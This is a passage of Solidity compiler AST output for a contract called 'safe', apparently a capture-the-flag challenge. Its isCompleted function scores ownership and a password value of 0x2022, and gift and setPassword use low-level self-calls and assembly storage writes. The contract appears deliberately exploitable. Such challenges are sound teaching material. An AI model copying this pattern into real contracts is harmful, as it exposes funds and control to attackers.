																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_safe_$239",
																		"typeString": "contract safe"
																	}
																],
																"id": 151,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1402:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 153,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1402:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 154,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "1402:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$__$returns$_t_bool_$",
															"typeString": "function () payable returns (bool)"
														}
													},
													"id": 156,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1402:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1387:38:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 159,
															"name": "success",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 150,
															"src": "1444:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "676966742063616c6c206572726f72",
															"id": 160,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1452:17:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_cb847bf14921cc6ccff80cfaac441eb09a695cf13a8f33ef1c24a7acb50b4b44",
																"typeString": "literal_string \"gift call error\""
															},
															"value": "gift call error"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_cb847bf14921cc6ccff80cfaac441eb09a695cf13a8f33ef1c24a7acb50b4b44",
																"typeString": "literal_string \"gift call error\""
															}
														],
														"id": 158,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															257,
															258
														],
														"referencedDeclaration": 258,
														"src": "1436:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 161,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1436:34:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 162,
												"nodeType": "ExpressionStatement",
												"src": "1436:34:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 174,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 163,
														"name": "success",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 150,
														"src": "1483:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 170,
																		"name": "SET",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 69,
																		"src": "1528:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes4",
																			"typeString": "bytes4"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 171,
																		"name": "val",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 145,
																		"src": "1532:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes4",
																			"typeString": "bytes4"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 168,
																		"name": "abi",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 241,
																		"src": "1511:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_abi",
																			"typeString": "abi"
																		}
																	},
																	"id": 169,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"memberName": "encodePacked",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1511:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																		"typeString": "function () pure returns (bytes memory)"
																	}
																},
																"id": 172,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1511:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 165,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 269,
																		"src": "1500:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_safe_$239",
																			"typeString": "contract safe"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_safe_$239",
																			"typeString": "contract safe"
																		}
																	],
																	"id": 164,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1492:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 166,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1492:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 167,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "1492:18:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$__$returns$_t_bool_$",
																"typeString": "function () payable returns (bool)"
															}
														},
														"id": 173,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1492:45:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "1483:54:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 175,
												"nodeType": "ExpressionStatement",
												"src": "1483:54:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 177,
															"name": "success",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 150,
															"src": "1556:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "63616c6c206661696c6564",
															"id": 178,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1564:13:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_a04f7977a7361020e07a160885cb05178aa6d9ff17ec37e942914b4316b9352a",
																"typeString": "literal_string \"call failed\""
															},
															"value": "call failed"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_a04f7977a7361020e07a160885cb05178aa6d9ff17ec37e942914b4316b9352a",
																"typeString": "literal_string \"call failed\""
															}
														],
														"id": 176,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															257,
															258
														],
														"referencedDeclaration": 258,
														"src": "1548:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 179,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1548:30:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 180,
												"nodeType": "ExpressionStatement",
												"src": "1548:30:0"
											}
										]
									},
									"documentation": null,
									"id": 182,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "gift",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 125,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 124,
												"name": "_target",
												"nodeType": "VariableDeclaration",
												"scope": 182,
												"src": "1189:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 123,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1189:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1188:17:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 126,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1211:0:0"
									},
									"scope": 239,
									"src": "1175:411:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 197,
										"nodeType": "Block",
										"src": "1633:112:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 193,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 188,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 254,
																	"src": "1652:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 189,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1652:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 191,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 269,
																		"src": "1672:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_safe_$239",
																			"typeString": "contract safe"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_safe_$239",
																			"typeString": "contract safe"
																		}
																	],
																	"id": 190,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1664:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 192,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1664:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "1652:25:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 187,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															257,
															258
														],
														"referencedDeclaration": 257,
														"src": "1644:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 194,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1644:34:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 195,
												"nodeType": "ExpressionStatement",
												"src": "1644:34:0"
											},
											{
												"externalReferences": [
													{
														"val": {
															"declaration": 184,
															"isOffset": false,
															"isSlot": false,
															"src": "1723:3:0",
															"valueSize": 1
														}
													}
												],
												"id": 196,
												"nodeType": "InlineAssembly",
												"operations": "{\n    sstore(1, val)\n}",
												"src": "1689:56:0"
											}
										]
									},
									"documentation": null,
									"id": 198,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "setPassword",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 185,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 184,
												"name": "val",
												"nodeType": "VariableDeclaration",
												"scope": 198,
												"src": "1615:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 183,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1615:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1614:13:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 186,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1633:0:0"
									},
									"scope": 239,
									"src": "1594:151:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 206,
										"nodeType": "Block",
										"src": "1818:329:0",
										"statements": [
											{
												"externalReferences": [
													{
														"val": {
															"declaration": 203,
															"isOffset": false,
															"isSlot": false,
															"src": "2101:3:0",
															"valueSize": 1
														}
													},
													{
														"sel": {
															"declaration": 201,
															"isOffset": false,
															"isSlot": false,
															"src": "1997:3:0",
															"valueSize": 1
														}
													}
												],
												"id": 205,
												"nodeType": "InlineAssembly",
												"operations": "{\n    if iszero(eq(returndatasize(), 0x24))\n    {\n        revert(0, 0)\n    }\n    let ptr := mload(0x40)\n    returndatacopy(ptr, 0, 0x24)\n    sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)\n    val := mload(add(0x04, ptr))\n}",
												"src": "1829:318:0"
											}
										]
									},
									"documentation": null,
									"id": 207,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": true,
									"modifiers": [],
									"name": "getReturns",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 199,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1772:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 204,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 201,
												"name": "sel",
												"nodeType": "VariableDeclaration",
												"scope": 207,
												"src": "1794:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes4",
													"typeString": "bytes4"
												},
												"typeName": {
													"id": 200,
													"name": "bytes4",
													"nodeType": "ElementaryTypeName",
													"src": "1794:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes4",
														"typeString": "bytes4"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 203,
												"name": "val",
												"nodeType": "VariableDeclaration",
												"scope": 207,
												"src": "1806:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 202,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1806:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1793:25:0"
									},
									"scope": 239,
									"src": "1753:394:0",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 210,
										"nodeType": "Block",
										"src": "2181:2:0",
										"statements": []
									},
									"documentation": null,
									"id": 211,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 208,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2163:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 209,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2181:0:0"
									},
									"scope": 239,
									"src": "2155:28:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": {
										"id": 237,
										"nodeType": "Block",
										"src": "2223:161:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 216,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 214,
														"name": "score",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 64,
														"src": "2234:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 215,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2240:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2234:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 217,
												"nodeType": "ExpressionStatement",
												"src": "2234:7:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													},
													"id": 221,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 218,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 254,
															"src": "2255:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 219,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "2255:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"id": 220,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "2267:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "2255:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 227,
												"nodeType": "IfStatement",
												"src": "2252:57:0",
												"trueBody": {
													"id": 226,
													"nodeType": "Block",
													"src": "2273:36:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 224,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 222,
																	"name": "score",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 64,
																	"src": "2288:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3530",
																	"id": 223,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2295:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_50_by_1",
																		"typeString": "int_const 50"
																	},
																	"value": "50"
																},
																"src": "2288:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 225,
															"nodeType": "ExpressionStatement",
															"src": "2288:9:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 230,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 228,
														"name": "password",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 62,
														"src": "2322:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "307832303232",
														"id": 229,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2334:6:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_8226_by_1",
															"typeString": "int_const 8226"
														},
														"value": "0x2022"
													},
													"src": "2322:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 236,
												"nodeType": "IfStatement",
												"src": "2319:58:0",
												"trueBody": {
													"id": 235,
													"nodeType": "Block",
													"src": "2341:36:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 233,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 231,
																	"name": "score",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 64,
																	"src": "2356:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3530",
																	"id": 232,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2363:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_50_by_1",
																		"typeString": "int_const 50"
																	},
																	"value": "50"
																},
																"src": "2356:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 234,
															"nodeType": "ExpressionStatement",
															"src": "2356:9:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 238,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "isCompleted",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 212,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2215:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 213,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2223:0:0"
									},
									"scope": 239,
									"src": "2195:189:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 240,
							"src": "651:1736:0"
						}
					],
					"src": "0:2387:0"
				},
				"id": 0
			}
		}
	}
}